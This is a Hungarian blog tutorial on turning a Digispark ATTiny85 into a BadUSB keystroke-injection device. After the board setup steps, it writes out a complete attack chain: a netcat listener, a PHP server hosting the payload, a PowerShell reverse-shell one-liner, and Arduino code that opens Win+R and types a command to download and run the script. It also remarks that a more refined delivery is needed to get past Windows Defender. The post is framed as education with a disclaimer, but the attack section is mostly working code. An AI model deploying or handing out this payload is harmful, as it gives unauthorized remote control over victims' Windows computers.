+++
title= "Csak egy ártatlan pendrive"
date= 2024-07-23T19:22:46+02:00
draft= false
toc= true
summary = "Filmekben lehet látni olyat, hogy a titkosügynökök a számítógépbe dugnak egy pendrive-ot és utána történik a varázslat. Itt is valami hasonlót csinálok, csak informatikusként sokkal menőbb vagyok mint a titkosügynökök."
description = "Piacon már régota kint van a USB Rubber Ducky, ami lényegében egy pendrive-nak álcázott mikrokontroller. Közönséges érdelődők számára kicsit elérhetetlen áron van szerintem, mivel jelenleg $80 egy darab. Ezért szerettem volna kipróbálni egy olcsóbb de minőségben közelítő alternatívát."
tags = ['Digispark', 'badusb', 'infosec']
+++

Bedugod, eltelik 5 másodperc, megtörténik a varázs és kihúzod. Nem, ez most nem az forgatókönyv amire gondolsz, ez történik a USB Rubber Ducky-hez hasonló mikrokontrollerek használatakor. Lényegében a számítógép ilyenkor ezeket az eszközöket HID-ként, azaz Human Interface Device-ként kezeli, mint például egy billentyűzetet is. Ez azt engedi meg, hogy lényegében az USB bedugása után elindul az arra feltöltött program, és elkezdi gépelni ezerrel azt, mindeközben az operációs rendszer teljes engedelmességet tanusít. Első kérdés az lenne, hogy ezt miért teheti meg, miért nem kér a számítógép jogosultságot? Billentyűzetben is megbízik a számítógép, mivel ember ül mögötte nem pedig egy zsarolóprogram vagy bármi ilyesmi, és hasonlanó viszonyúl minden más HID-hez is, beleértve a "badUSB"-t is. Ezek a kis eszközök viszont sokkal gyorsabban tudnak gépelni mint egy ember, ezért a lehetőségeknek csak a kreativitás szab határt. Azt nem szabad elfelejteni, hogy talán azért nem jelent ez akkora biztonsági kockázatot, mint ahogyan én most itt felvezettem, mert egy nagyon fontos feltételnek teljesülnie kell a müködéséhez: fizikai jelenlét. Ez nagy kihívást jelenthet a legtöbb támadó fél számára, de az esély rá nem 0 tehát számolni kell vele. Olyanra is volt már példa, hogy célzottan például egy rendőrség vagy irodaház parkolójában szórtak szét ilyen kártékony USB-ket és az áldozatok, emberlétükre kiváncsiságból bedugták a szervezeti, céges számítógépükbe és a baj meg is történt még mielőtt észrevették volna.

Persze nem csak csúnya dolgokra lehet ezt használni. Ha például rendszergazdák vagyunk akkor akár a repetatív feladatokat könnyen felcserélhetjük egy bedugás és kihúzás mozdulatára ennek segítségével.

## Felelősség

A tudás és a tapsztalat felelősséggel, és azon kötelességgel jár, hogy csak is embertársaink, és környezetünk előnyére, jólétére használhatjuk fel. Semmilyen körülmények között nem élhetünk vissza azzal a hatalommal, amelyet az élet ruházott ránk, amikor voltunk olyan szerencsések, hogy valamire rájöttünk, valamit megtanultunk. Ez különösen igaz a kiberbiztonság témakörében és még máskor is ki fogom ezt hangsúlyozni. Én az itt bemutatott technikákat csakis saját, vagy olyan rendszeren, számítógépen próbálom ki, amelyekhez engedélyt kaptam a tulajdonostól. A célom az a dokumentálás és a tanításnak a szándéka, hogy így egy biztonságosabb internet és informatika születhessen. **Ezáltal szeretném tisztázni, hogy engem semmilyen felelősség nem terhel, hogy TE a saját döntéseid után ezt a tudást mire használod.**

## Digispark ATTiny85

Az alternatívát a Digispark kínálja mely egy ATTiny85 8 bites RISC utasításkészletű mikrokontrollerrel rendelkezik, amely hála a fejlesztőknek, kompatibilis az Arduino IDE fejlesztői környezettel egy kis babrálás után. Az ára rendkívül baráti a $80-hoz képest, magyarországi forgalmazók 1500 Ft környékén árulják, de ha van időd megvárni, akkor lehet hogy Aliexpressről olcsőbban be tudod szerezni. Nem promóció de [itt](https://www.hestore.hu/prod_10036419.html) egy magyar forgalmazónál egy példa.

Itt a cukiság

![Digispark](/digispark.jpg)

### Ardunio IDE setup

Az Arduino IDE-t töltsd le a hivatalos oldalról, vagy csomagkezelőddel (nekem a csomagkezelős változat hiányos volt). Mivel ez nem egy Arduino board ezér külön le kell tölteni hozzá az illesztést. Ezt az alábbi módon tudod megtenni:
1. **File >> Prefrences >> Additional board manager URLs:** ide illeszd be ezt a linket **https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json** (más tutoriálokban esetleg más linket látsz az azért van mert azok még a hivatalos oldalról vannak, de sajnos nem olyan rég megszűnt a támogatás onnan, ezért kellett kiásnom a Github repo-ból ugyanarra a fájlra mutató linket).
2. **Board manager >> Itt keresd meg a "Digistump AVR" csomagot** és töltsd le.
3. **Tools >> Itt a "programmer"-nél** válaszd ki a Micronucleus-t, a "board"-nál pedig a Digispark 16,5 Mhz (default)-ot.

Kész is vagy!

### Egyéb

Az eredeti Arduino board-okat az operációs rendszerek automatikusan ellátják a megfelelő jogosultságokkal, hogy programozhatóak legyenek, de könnyen lehet hogy neked a Digisparkot nem ismeri fel hasonlóképpen. Ennek megoldásához Linuxon a továbbiakat kell tenned:

1. Hozz létre egy 49-micronucleus.rules fájlt az itt jelölt helyen: /etc/udev/rules.d/49-micronucleus.rules
2. Másold bele ezeket a sorokat és futtasd a parancsot: 

SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"

KERNEL=="ttyACM*", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666", ENV{ID_MM_DEVICE_IGNORE}="1"

```sh 
sudo udevadm control --reload-rules
```

## Payload

Most már lehet programozni a kis cukiságot. Én példaképpen egy rendkívül egyszerű reverse shell-t fogok megvalósítani vele, a cél számítógép és a saját gépem között.

> **Reverse shell:** A shell az egy médium, egy interfész a felhasználó és a vas között, ami általában parancssorba gépelt utasításokat lefordít a számítógép nyelvére, hogy aztán a kernel segítségével végrehajtódjanak. A shell az vonatkozhat egy távoli eléréssel kapcsolódott számítógépre is, erre ismert protokolok például az SSH (Secure Shell). Ilyenkor a távoli számítógép "hallgatózik", hogy van-e valaki aki kapcsolatot akar teremteni vele, és ha mi akarunk az otthoni gépünkről elérni az ottani shell-t, akkor mi küldünk kérést neki. A **reverse shell** "reverse" része abból következik, hogy ilyenkor a szerepek feladata megcserélődik, a távoli gép kezdeményezi a csatlakozást. Ezt azért használják támadási vektornak mert a cél számítógép tűzfala a kimenő kéréseket nem akadályozza meg, de a bemenőeket igen. Egy ilyen reverse shell a támadónak esélyt ad, hogy fájlokat szolgáltasson ki, megteremtse a perzisztenciát, hogy ki-be tudjon járkálni kedve szerintde más sérülékenységekkel vegyítve tetszőleges célokat el tud érni vele.

![reverseshell](/reverse_shell.jpg)

Én ezt a legamatőrebb módon teszem meg (ez egy egy valós szituációban nem állna meg a helyét), csupán a koncepciót és a Digispark képességeinek egy töredékét szeretném bemutatni. A lényeg az, hogy lokálisan szolgáltatom egy php szerveren a powershell scriptet, illetve "hallgatózom" a saját gépemen a reverse shell kérést várva. Majd a cél gépen ezt a scriptet töltjük le (az USB segítségével), amit futtatva powershell-ben, csatlakozik a "hallgatózó" számítógépünkhez, így megteremtve a reverse shell-t. Ezt a folyamatot egy valós helyzetben botnettel csinálná a támadó szerintem, hogy a kilétét elfedje.

**Netcat-tel hallgatózom a 4444 porton**

```sh
nc -lp 4444
```

**php szerverrel szolgáltatom azt a könyvtárat, ahol a script van**

```sh
sudo php -S 0.0.0.0:80 -t /directory/to/folder/of/powershellScript/
```

**payload.ps1 fájl tartalma, ez a powershell script amit megosztunk**

Változtasd meg a saját host IP címedre a "HOST_IP_ADDRESS"-t.

```ps
$sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```
Samratashok érdeme ez a kis script. [Github repo](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)

Most pedig az amit tényleg az USB fog csinálni. Ugyebár úgy kell gondolkodnunk mintha egy billentyűzetet kellene programozni előre. Ahogy már említettem ehhez az Arduino IDE segítségünkre lesz.

```C
#include "DigiKeyboard.h" // a header ami leegyszerűsíti a parancsok kiírását
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0); // az eddigi gépelést "reset"-eljük
  DigiKeyboard.delay(500); // várást kell illetve ajánlott beiktatni, mert a számítógép sokszor nincs felkészülve a hirtelen billentyűnyomásra és esetleg figyelmenkívül hagy egy betűt, ezzel elrontva mindent akár
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\""); // az említett script letöltése és futtatása, itt amúgy nekem itt bejelezett a Windows Defender, ezért kifinomultabb delivery módszer szükséges
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    // üres ciklus, hogy ne fusson le újra a script
  }
}
```
Ezt a kódot feltöltjük a Micronucleus-szal a Digispark-ra és már készen is vagyunk. A saját LAN-on most már bármelyik Windows gép fölött átvehetjük az irányítást.
